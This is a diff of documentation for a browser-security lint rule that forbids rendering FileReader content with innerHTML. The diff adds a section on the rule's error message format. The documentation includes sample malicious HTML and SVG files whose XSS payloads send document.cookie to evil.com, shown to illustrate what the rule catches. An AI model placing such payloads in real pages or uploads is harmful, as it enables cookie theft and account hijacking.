@@ -1,12 +1,30 @@
 ---
-title: browser-security/no-filereader-innerhtml
-description: 🔒 Disallow using innerHTML with FileReader data
+title: "browser-security/no-filereader-innerhtml"
+description: "The rule provides **LLM-optimized error messages** (Compact 2-line format) with actionable security guidance:"
 ---
-
 
 import { FalseNegativeCTA, WhenNotToUse } from "@/components/RuleComponents";
 
 > 🔒 Disallow using innerHTML with FileReader data
+
+## Error Message Format
+
+The rule provides **LLM-optimized error messages** (Compact 2-line format) with actionable security guidance:
+
+```text
+⚠️ CWE-79 OWASP:A05 CVSS:6.1 | Cross-site Scripting (XSS) detected | MEDIUM [SOC2,PCI-DSS,GDPR,ISO27001]
+   Fix: Review and apply the recommended fix | https://owasp.org/Top10/A05_2021/
+```
+
+### Message Components
+
+| Component | Purpose | Example |
+| :--- | :--- | :--- |
+| **Risk Standards** | Security benchmarks | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) [OWASP:A05](https://owasp.org/Top10/A05_2021-Injection/) [CVSS:6.1](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
+| **Issue Description** | Specific vulnerability | `Cross-site Scripting (XSS) detected` |
+| **Severity & Compliance** | Impact assessment | `MEDIUM [SOC2,PCI-DSS,GDPR,ISO27001]` |
+| **Fix Instruction** | Actionable remediation | `Follow the remediation steps below` |
+| **Technical Truth** | Official reference | [OWASP Top 10](https://owasp.org/Top10/A05_2021-Injection/) |
 
 ## Rule Details
 
@@ -16,16 +34,18 @@ This rule prevents using `innerHTML`, `outerHTML`, `insertAdjacentHTML()`, or `d
 
 ```mermaid
 flowchart TD
-    A[User uploads malicious.html] --> B[FileReader reads content]
-    B --> C{How is content rendered?}
-    C -->|innerHTML| D[XSS Executes!]
-    C -->|textContent| E[Safe - Displayed as text]
-    C -->|DOMPurify.sanitize| F[Safe - Scripts removed]
+    A["User uploads malicious.html"] --> B["FileReader reads content"]
+    B --> C{"How is content rendered?"}
+    C -->|innerHTML| D["XSS Executes!"]
+    C -->|textContent| E["Safe - Displayed as text"]
+    C -->|DOMPurify.sanitize| F["Safe - Scripts removed"]
 
     style D fill:#ff6b6b
     style E fill:#51cf66
     style F fill:#51cf66
+
 ```
+
 
 When you render file content with innerHTML:
 
@@ -128,7 +148,7 @@ The rule detects:
 ### Malicious HTML File
 
 ```html
-{/*  malicious.html  */}
+
 <img src="x" onerror="fetch('https://evil.com?c='+document.cookie)" />
 <script>
   new Image().src = 'https://evil.com?' + document.cookie;
@@ -138,7 +158,7 @@ The rule detects:
 ### Malicious SVG File
 
 ```xml
-{/*  malicious.svg  */}
+
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
   <script>fetch('https://evil.com?cookies='+document.cookie)</script>
 </svg>
@@ -158,12 +178,11 @@ However, **always sanitize file content** before rendering as HTML.
 - [`browser-security/no-innerhtml`](./no-innerhtml.md) - General innerHTML prevention
 - [`browser-security/no-postmessage-innerhtml`](./no-postmessage-innerhtml.md) - postMessage XSS prevention
 
-
 <WhenNotToUse />
 
-## Known False Negatives
-
 <FalseNegativeCTA />
+
+## Known False Negatives
 
 The following patterns are **not detected** due to static analysis limitations:
 
